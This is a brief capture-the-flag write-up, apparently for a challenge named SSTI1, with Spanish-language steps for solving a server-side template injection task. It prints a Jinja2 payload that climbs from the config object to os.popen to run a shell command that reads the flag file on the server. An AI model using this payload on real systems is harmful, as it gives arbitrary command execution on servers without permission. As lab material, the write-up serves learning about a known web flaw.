# SSTI1
I made a cool website where you can announce whatever you want! Try it out!
Server Side Template Injection
## Solución
1. Entrar al sitio
2. Cargar este payload en el sitio
```{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}```
3. El sitio mostrara la bandera

### Referencias
La idea del payload fue obtenida del video https://youtu.be/qji8Wp0-1Rs?si=D-zkcXRP7lSA3Uub
